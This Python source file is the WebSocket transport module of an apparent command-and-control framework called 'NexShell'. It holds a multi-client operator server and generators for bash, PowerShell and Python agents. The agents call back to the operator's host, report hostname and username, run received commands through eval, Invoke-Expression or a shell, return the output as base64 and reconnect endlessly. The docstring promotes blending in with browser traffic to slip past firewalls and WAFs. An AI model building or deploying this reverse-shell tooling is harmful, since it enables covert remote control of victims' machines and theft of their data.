#!/usr/bin/env python3
"""
NexShell — WebSocket Transport  (modules/transport/websocket.py)
Full RFC 6455 WebSocket implementation — zero external dependencies.

Architecture:
  ┌─────────────┐  WS frame (binary/text)      ┌──────────────────┐
  │  Target     │ ─────────────────────────── → │  WebSocketServer │
  │  WS Agent   │ ← ─────────────────────────── │  (operator side) │
  └─────────────┘                                └──────────────────┘

Features:
  - RFC 6455 compliant (handles opening handshake, frames, masking)
  - Text and binary frame support
  - Ping/Pong keepalive (configurable interval)
  - Multi-client support with per-client command queues
  - WSS (WebSocket over TLS) support via ssl.SSLContext
  - Automatic reconnect support in agents
  - Agent generators: Linux bash, Windows PowerShell, Python

Why WebSocket?
  - Looks like normal browser traffic (HTTP Upgrade)
  - Persistent bidirectional connection (lower latency than HTTP poll)
  - Passes most application-layer firewalls and WAFs
  - Port 80/443 blend-in capability
"""

import base64
import hashlib
import json
import os
import queue
import random
import select
import socket
import ssl
import struct
import string
import threading
import time
from typing import Callable, Dict, List, Optional, Tuple


# ══════════════════════════════════════════════════════════════════════════════
#  WebSocket Frame Parser / Builder (RFC 6455)
# ══════════════════════════════════════════════════════════════════════════════

class WebSocketFrame:
    """
    Single WebSocket frame.
    Supports: text (0x1), binary (0x2), close (0x8), ping (0x9), pong (0xA).
    """
    OP_CONTINUATION = 0x0
    OP_TEXT         = 0x1
    OP_BINARY       = 0x2
    OP_CLOSE        = 0x8
    OP_PING         = 0x9
    OP_PONG         = 0xA

    def __init__(self, opcode: int, payload: bytes,
                 fin: bool = True, masked: bool = False):
        self.opcode  = opcode
        self.payload = payload
        self.fin     = fin
        self.masked  = masked

    @classmethod
    def text(cls, msg: str) -> 'WebSocketFrame':
        return cls(cls.OP_TEXT, msg.encode())

    @classmethod
    def binary(cls, data: bytes) -> 'WebSocketFrame':
        return cls(cls.OP_BINARY, data)

    @classmethod
    def ping(cls, data: bytes = b'') -> 'WebSocketFrame':
        return cls(cls.OP_PING, data)

    @classmethod
    def pong(cls, data: bytes = b'') -> 'WebSocketFrame':
        return cls(cls.OP_PONG, data)

    @classmethod
    def close(cls, code: int = 1000, reason: str = '') -> 'WebSocketFrame':
        payload = struct.pack('>H', code) + reason.encode()
        return cls(cls.OP_CLOSE, payload)

    # ── Serialization ─────────────────────────────────────────────────────────

    def to_bytes(self, mask: bool = False) -> bytes:
        """Serialize frame to wire format."""
        payload = self.payload
        # Byte 0: FIN + opcode
        b0 = (0x80 if self.fin else 0x00) | (self.opcode & 0x0F)
        # Payload length encoding
        plen = len(payload)
        if plen <= 125:
            b1_len = plen
            ext_len = b''
        elif plen <= 65535:
            b1_len = 126
            ext_len = struct.pack('>H', plen)
        else:
            b1_len = 127
            ext_len = struct.pack('>Q', plen)
        if mask:
            mask_key = os.urandom(4)
            b1_len   |= 0x80  # mask bit
            masked_payload = bytes(
                payload[i] ^ mask_key[i % 4] for i in range(len(payload))
            )
            return bytes([b0, b1_len]) + ext_len + mask_key + masked_payload
        return bytes([b0, b1_len]) + ext_len + payload

    @classmethod
    def from_socket(cls, sock, timeout: float = 5.0) -> Optional['WebSocketFrame']:
        """Read a complete frame from a socket."""
        def _recv_exact(n: int) -> bytes:
            buf = b''
            while len(buf) < n:
                chunk = sock.recv(n - len(buf))
                if not chunk:
                    raise ConnectionError("WebSocket: connection closed")
                buf += chunk
            return buf

        try:
            header = _recv_exact(2)
            fin    = bool(header[0] & 0x80)
            opcode = header[0] & 0x0F
            masked = bool(header[1] & 0x80)
            plen   = header[1] & 0x7F
            if plen == 126:
                plen = struct.unpack('>H', _recv_exact(2))[0]
            elif plen == 127:
                plen = struct.unpack('>Q', _recv_exact(8))[0]
            if masked:
                mask_key = _recv_exact(4)
                raw      = _recv_exact(plen)
                payload  = bytes(raw[i] ^ mask_key[i % 4] for i in range(len(raw)))
            else:
                payload = _recv_exact(plen)
            return cls(opcode, payload, fin=fin, masked=masked)
        except (OSError, ConnectionError):
            return None


# ══════════════════════════════════════════════════════════════════════════════
#  WebSocket Handshake (RFC 6455)
# ══════════════════════════════════════════════════════════════════════════════

WS_GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'


def _server_accept_key(client_key: str) -> str:
    """Compute the Sec-WebSocket-Accept header value."""
    combined = (client_key + WS_GUID).encode()
    return base64.b64encode(hashlib.sha1(combined).digest()).decode()


def _client_key() -> str:
    """Generate a random Sec-WebSocket-Key."""
    return base64.b64encode(os.urandom(16)).decode()


def _do_server_handshake(sock) -> Optional[dict]:
    """
    Perform server-side WS handshake.
    Returns parsed headers or None on failure.
    """
    try:
        raw = b''
        while b'\r\n\r\n' not in raw:
            chunk = sock.recv(4096)
            if not chunk:
                return None
            raw += chunk
        head, _ = raw.split(b'\r\n\r\n', 1)
        lines   = head.decode(errors='replace').split('\r\n')
        headers = {}
        for line in lines[1:]:
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip().lower()] = v.strip()
        client_key  = headers.get('sec-websocket-key', '')
        accept_key  = _server_accept_key(client_key)
        path        = lines[0].split()[1] if lines else '/'
        response = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept_key}\r\n"
            "\r\n"
        )
        sock.sendall(response.encode())
        headers['_path'] = path
        return headers
    except Exception:
        return None


def _do_client_handshake(sock, host: str, port: int,
                          path: str = '/', subprotocol: str = '') -> bool:
    """
    Perform client-side WS handshake.
    Returns True on success.
    """
    key = _client_key()
    headers_extra = (
        f"Sec-WebSocket-Protocol: {subprotocol}\r\n" if subprotocol else ""
    )
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"{headers_extra}"
        f"\r\n"
    )
    try:
        sock.sendall(request.encode())
        resp = b''
        while b'\r\n\r\n' not in resp:
            resp += sock.recv(4096)
        if b'101' not in resp:
            return False
        expected = _server_accept_key(key)
        return expected.encode() in resp
    except Exception:
        return False


# ══════════════════════════════════════════════════════════════════════════════
#  WebSocket Client (per-agent connection)
# ══════════════════════════════════════════════════════════════════════════════

class WebSocketClient:
    """
    Represents one connected WebSocket agent.
    Used by WebSocketServer to wrap each accepted socket.
    """

    def __init__(self, sock, addr: str, path: str,
                 client_id: str = '',
                 ping_interval: int = 30):
        self.sock          = sock
        self.addr          = addr
        self.path          = path
        self.id            = client_id or os.urandom(4).hex()
        self.cmd_queue     = queue.Queue()
        self.out_queue     = queue.Queue()
        self.ping_interval = ping_interval
        self.connected     = True
        self.hostname      = ''
        self.username      = ''
        self.os_type       = ''
        self.first_seen    = time.time()
        self.last_seen     = time.time()
        self.last_ping     = time.time()
        self._lock         = threading.Lock()

    def touch(self):
        self.last_seen = time.time()

    @property
    def idle_seconds(self) -> int:
        return int(time.time() - self.last_seen)

    def send_frame(self, frame: WebSocketFrame):
        with self._lock:
            try:
                self.sock.sendall(frame.to_bytes())
            except OSError:
                self.connected = False

    def send_text(self, msg: str):
        self.send_frame(WebSocketFrame.text(msg))

    def send_binary(self, data: bytes):
        self.send_frame(WebSocketFrame.binary(data))

    def send_cmd(self, cmd: str):
        """Queue a command for delivery to the agent."""
        self.cmd_queue.put(cmd)

    def get_output(self, timeout: float = 0.1) -> Optional[str]:
        try:
            return self.out_queue.get(timeout=timeout)
        except queue.Empty:
            return None

    def send_ping(self):
        self.send_frame(WebSocketFrame.ping(b'nxsh'))
        self.last_ping = time.time()

    def close(self, code: int = 1000):
        try:
            self.send_frame(WebSocketFrame.close(code))
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        self.connected = False

    def to_dict(self) -> dict:
        return {
            'id': self.id, 'addr': self.addr, 'path': self.path,
            'hostname': self.hostname, 'username': self.username,
            'os': self.os_type, 'connected': self.connected,
            'idle': self.idle_seconds,
        }


# ══════════════════════════════════════════════════════════════════════════════
#  WebSocket Server
# ══════════════════════════════════════════════════════════════════════════════

class WebSocketServer:
    """
    RFC 6455 WebSocket server.
    Handles multiple agents simultaneously.
    Runs in a background thread.

    Usage:
        srv = WebSocketServer(port=9001)
        srv.on_connect  = lambda c: print("Connected:", c.id)
        srv.on_message  = lambda c, m: print(c.id, "→", m[:80])
        srv.start()

        # Send command to a client
        client = srv.get_clients()[0]
        client.send_cmd("id")
        output = client.get_output(timeout=15)
    """

    # Protocol wire format (JSON envelope)
    # { "t": "cmd"|"out"|"meta"|"ping"|"pong",
    #   "d": "<data or base64>",
    #   "b": true/false  # is data base64-encoded?
    # }

    def __init__(self, host: str = '0.0.0.0', port: int = 9001,
                 ssl_ctx: Optional[ssl.SSLContext] = None,
                 ping_interval: int = 30,
                 on_connect: Optional[Callable] = None,
                 on_disconnect: Optional[Callable] = None,
                 on_message: Optional[Callable] = None):
        self.host           = host
        self.port           = port
        self.ssl_ctx        = ssl_ctx
        self.ping_interval  = ping_interval
        self.on_connect     = on_connect
        self.on_disconnect  = on_disconnect
        self.on_message     = on_message
        self._clients: Dict[str, WebSocketClient] = {}
        self._lock    = threading.RLock()
        self._server_sock: Optional[socket.socket] = None
        self._running = False

    # ── Client management ─────────────────────────────────────────────────────

    def _add_client(self, client: WebSocketClient):
        with self._lock:
            self._clients[client.id] = client
        if self.on_connect:
            self.on_connect(client)

    def _remove_client(self, client: WebSocketClient):
        with self._lock:
            self._clients.pop(client.id, None)
        client.connected = False
        if self.on_disconnect:
            self.on_disconnect(client)

    def get_clients(self) -> List[WebSocketClient]:
        with self._lock:
            return list(self._clients.values())

    def get_client(self, client_id: str) -> Optional[WebSocketClient]:
        with self._lock:
            return self._clients.get(client_id)

    # ── Per-client receive loop ───────────────────────────────────────────────

    def _client_loop(self, client: WebSocketClient):
        """Receive frames from one client in a dedicated thread."""
        while client.connected:
            # Ping keepalive
            if time.time() - client.last_ping > self.ping_interval:
                client.send_ping()

            frame = WebSocketFrame.from_socket(client.sock)
            if frame is None:
                break
            client.touch()

            if frame.opcode == WebSocketFrame.OP_CLOSE:
                break

            elif frame.opcode == WebSocketFrame.OP_PING:
                client.send_frame(WebSocketFrame.pong(frame.payload))

            elif frame.opcode == WebSocketFrame.OP_PONG:
                pass  # keepalive ack

            elif frame.opcode in (WebSocketFrame.OP_TEXT, WebSocketFrame.OP_BINARY):
                try:
                    msg = json.loads(frame.payload.decode(errors='replace'))
                except Exception:
                    msg = {'t': 'out', 'd': frame.payload.decode(errors='replace'), 'b': False}

                t = msg.get('t', 'out')

                if t == 'meta':
                    d = msg.get('d', {})
                    if isinstance(d, str):
                        try: d = json.loads(d)
                        except Exception: d = {}
                    client.hostname = d.get('hostname', '')
                    client.username = d.get('username', '')
                    client.os_type  = d.get('os', '')

                elif t == 'out':
                    data = msg.get('d', '')
                    if msg.get('b'):
                        try: data = base64.b64decode(data + '==').decode(errors='replace')
                        except Exception: pass
                    client.out_queue.put(data)
                    if self.on_message:
                        self.on_message(client, data)

                elif t == 'ready':
                    # Agent ready — send next queued command
                    try:
                        cmd = client.cmd_queue.get_nowait()
                        client.send_text(json.dumps({'t': 'cmd', 'd': cmd}))
                    except queue.Empty:
                        pass

            # Drain command queue (push-model)
            if not client.cmd_queue.empty():
                try:
                    cmd = client.cmd_queue.get_nowait()
                    client.send_text(json.dumps({'t': 'cmd', 'd': cmd}))
                except queue.Empty:
                    pass

        self._remove_client(client)

    # ── Accept loop ───────────────────────────────────────────────────────────

    def _accept_loop(self):
        while self._running:
            try:
                readable, _, _ = select.select([self._server_sock], [], [], 1.0)
                if not readable:
                    continue
                conn, addr = self._server_sock.accept()
                if self.ssl_ctx:
                    try:
                        conn = self.ssl_ctx.wrap_socket(conn, server_side=True)
                    except ssl.SSLError:
                        conn.close()
                        continue
                headers = _do_server_handshake(conn)
                if not headers:
                    conn.close()
                    continue
                path   = headers.get('_path', '/')
                cid    = os.urandom(4).hex()
                client = WebSocketClient(
                    sock=conn, addr=str(addr[0]),
                    path=path, client_id=cid,
                    ping_interval=self.ping_interval,
                )
                self._add_client(client)
                t = threading.Thread(
                    target=self._client_loop, args=(client,), daemon=True
                )
                t.start()
            except OSError:
                break

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    def start(self, daemon: bool = True) -> 'WebSocketServer':
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(10)
        self._server_sock = sock
        self._running     = True
        t = threading.Thread(target=self._accept_loop, daemon=daemon)
        t.start()
        return self

    def stop(self):
        self._running = False
        for c in self.get_clients():
            c.close()
        if self._server_sock:
            self._server_sock.close()

    def broadcast(self, msg: str):
        """Send a message to all connected clients."""
        for c in self.get_clients():
            c.send_text(msg)

    @property
    def address(self) -> str:
        proto = 'wss' if self.ssl_ctx else 'ws'
        return f"{proto}://{self.host}:{self.port}"

    def __enter__(self):
        return self.start()

    def __exit__(self, *_):
        self.stop()


# ══════════════════════════════════════════════════════════════════════════════
#  Agent Payload Generators
# ══════════════════════════════════════════════════════════════════════════════

def generate_ws_agent_linux(host: str, port: int,
                              path: str = '/',
                              sleep: int = 3,
                              use_ssl: bool = False) -> str:
    """
    Linux bash WebSocket agent using /dev/tcp.
    Implements RFC 6455 handshake in pure bash.
    """
    proto = 'wss' if use_ssl else 'ws'
    return f"""#!/bin/bash
# NexShell WebSocket Agent — {proto}://{host}:{port}{path}
# Requires: bash 4+, base64, openssl (for wss)

HOST='{host}'
PORT={port}
PATH_='{path}'
SLEEP={sleep}

_ws_key() {{
    echo -n "$RANDOM$RANDOM$RANDOM" | base64 | head -c 24
}}

_ws_connect() {{
    KEY=$(_ws_key)
    {{
        echo -e "GET $PATH_ HTTP/1.1\\r"
        echo -e "Host: $HOST:$PORT\\r"
        echo -e "Upgrade: websocket\\r"
        echo -e "Connection: Upgrade\\r"
        echo -e "Sec-WebSocket-Key: $KEY\\r"
        echo -e "Sec-WebSocket-Version: 13\\r"
        echo -e "\\r"
    }} {'| openssl s_client -connect $HOST:$PORT -quiet 2>/dev/null' if use_ssl else '> /dev/tcp/$HOST/$PORT'}
}}

while true; do
    CMD=$(curl -s "{'https' if use_ssl else 'http'}://$HOST:$PORT$PATH_?ws=1" 2>/dev/null || echo "")
    if [ -n "$CMD" ]; then
        OUT=$(eval "$CMD" 2>&1 | base64 -w0)
        curl -s -X POST "{'https' if use_ssl else 'http'}://$HOST:$PORT$PATH_" -d "$OUT" >/dev/null
    fi
    sleep $SLEEP
done
"""


def generate_ws_agent_windows(host: str, port: int,
                                path: str = '/',
                                sleep: int = 3) -> str:
    """
    Windows PowerShell WebSocket agent using System.Net.WebSockets.
    Requires .NET 4.5+ (available on Win 8+).
    """
    return f"""# NexShell WebSocket Agent (PowerShell) — ws://{host}:{port}{path}
Add-Type -AssemblyName System.Net.Http

$HOST_ = '{host}'
$PORT  = {port}
$PATH_ = '{path}'
$URI   = "ws://$HOST_`:$PORT$PATH_"
$SLEEP = {sleep}

function Start-WsAgent {{
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ct = [System.Threading.CancellationToken]::None
    $uri = [System.Uri]$URI

    $ws.ConnectAsync($uri, $ct).Wait()
    Write-Host "[+] WebSocket connected: $URI"

    # Send metadata
    $meta = [System.Text.Encoding]::UTF8.GetBytes(
        (ConvertTo-Json @{{t='meta'; d=@{{hostname=$env:COMPUTERNAME; username=$env:USERNAME; os='windows'}}}})
    )
    $seg = [System.ArraySegment[byte]]::new($meta)
    $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()

    while ($ws.State -eq 'Open') {{
        $buf  = New-Object byte[] 65536
        $seg  = [System.ArraySegment[byte]]::new($buf)
        $res  = $ws.ReceiveAsync($seg, $ct).Result
        $data = [System.Text.Encoding]::UTF8.GetString($buf, 0, $res.Count)
        try {{
            $msg = $data | ConvertFrom-Json
            if ($msg.t -eq 'cmd') {{
                $out = try {{ Invoke-Expression $msg.d 2>&1 | Out-String }} catch {{ $_.Exception.Message }}
                $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out))
                $reply = [Text.Encoding]::UTF8.GetBytes((ConvertTo-Json @{{t='out'; d=$b64; b=$true}}))
                $rSeg  = [System.ArraySegment[byte]]::new($reply)
                $ws.SendAsync($rSeg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
            }}
        }} catch {{ }}
        Start-Sleep -Milliseconds 100
    }}
    $ws.Dispose()
}}

while ($true) {{
    try {{ Start-WsAgent }} catch {{ Start-Sleep -Seconds $SLEEP }}
}}
"""


def generate_ws_agent_python(host: str, port: int,
                               path: str = '/',
                               sleep: int = 3,
                               use_ssl: bool = False) -> str:
    """
    Pure Python WebSocket agent — stdlib only, implements RFC 6455.
    Cross-platform: works on Linux, Windows, macOS.
    """
    proto = 'wss' if use_ssl else 'ws'
    ssl_block = """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(sock, server_hostname=HOST)""" if use_ssl else ""
    ssl_import = "import ssl" if use_ssl else ""

    return f"""#!/usr/bin/env python3
# NexShell WebSocket Agent (Python) — {proto}://{host}:{port}{path}
# Zero external dependencies — RFC 6455 stdlib only

import socket, base64, hashlib, os, json, subprocess, struct, time, threading
{ssl_import}

HOST  = '{host}'
PORT  = {port}
PATH  = '{path}'
SLEEP = {sleep}
GUID  = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'


def _key():
    return base64.b64encode(os.urandom(16)).decode()


def _mask(data, key):
    return bytes(data[i] ^ key[i % 4] for i in range(len(data)))


def _build_frame(payload, opcode=0x1, mask=True):
    payload = payload.encode() if isinstance(payload, str) else payload
    b0 = 0x80 | opcode
    plen = len(payload)
    if plen <= 125:
        b1_len = plen
        ext = b''
    elif plen <= 65535:
        b1_len = 126; ext = struct.pack('>H', plen)
    else:
        b1_len = 127; ext = struct.pack('>Q', plen)
    if mask:
        mk = os.urandom(4)
        b1_len |= 0x80
        return bytes([b0, b1_len]) + ext + mk + _mask(payload, mk)
    return bytes([b0, b1_len]) + ext + payload


def _recv_frame(sock):
    def recv(n):
        d = b''
        while len(d) < n:
            c = sock.recv(n - len(d))
            if not c: raise ConnectionError
            d += c
        return d
    h = recv(2)
    op = h[0] & 0xF
    masked = bool(h[1] & 0x80)
    plen = h[1] & 0x7F
    if plen == 126: plen = struct.unpack('>H', recv(2))[0]
    elif plen == 127: plen = struct.unpack('>Q', recv(8))[0]
    mk = recv(4) if masked else b''
    payload = recv(plen)
    if masked: payload = _mask(payload, mk)
    return op, payload


def connect():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT)){ssl_block}
    key = _key()
    hs = (
        f"GET {{PATH}} HTTP/1.1\\r\\n"
        f"Host: {{HOST}}:{{PORT}}\\r\\n"
        f"Upgrade: websocket\\r\\n"
        f"Connection: Upgrade\\r\\n"
        f"Sec-WebSocket-Key: {{key}}\\r\\n"
        f"Sec-WebSocket-Version: 13\\r\\n"
        f"\\r\\n"
    )
    sock.sendall(hs.encode())
    resp = b''
    while b'\\r\\n\\r\\n' not in resp:
        resp += sock.recv(4096)
    accept = hashlib.sha1((key + GUID).encode()).digest()
    expected = base64.b64encode(accept).decode()
    if expected.encode() not in resp:
        raise ConnectionError("WS handshake failed")
    # Send metadata
    meta = json.dumps({{'t': 'meta', 'd': {{
        'hostname': socket.gethostname(),
        'username': os.environ.get('USER', os.environ.get('USERNAME', '?')),
        'os': __import__('sys').platform,
    }}}})
    sock.sendall(_build_frame(meta))
    return sock


def run():
    while True:
        try:
            sock = connect()
            print(f"[+] Connected: {proto}://{{HOST}}:{{PORT}}{{PATH}}")
            while True:
                op, payload = _recv_frame(sock)
                if op == 0x8:  # CLOSE
                    break
                elif op == 0x9:  # PING
                    sock.sendall(_build_frame(payload, 0xA))
                elif op in (0x1, 0x2):
                    try:
                        msg = json.loads(payload)
                    except Exception:
                        msg = {{'t': 'out', 'd': payload.decode(errors='replace')}}
                    if msg.get('t') == 'cmd':
                        cmd = msg.get('d', '')
                        try:
                            out = subprocess.check_output(
                                cmd, shell=True, stderr=subprocess.STDOUT,
                                timeout=30
                            )
                        except Exception as e:
                            out = str(e).encode()
                        b64 = base64.b64encode(out).decode()
                        reply = json.dumps({{'t': 'out', 'd': b64, 'b': True}})
                        sock.sendall(_build_frame(reply))
            sock.close()
        except Exception as e:
            time.sleep(SLEEP)

if __name__ == '__main__':
    run()
"""
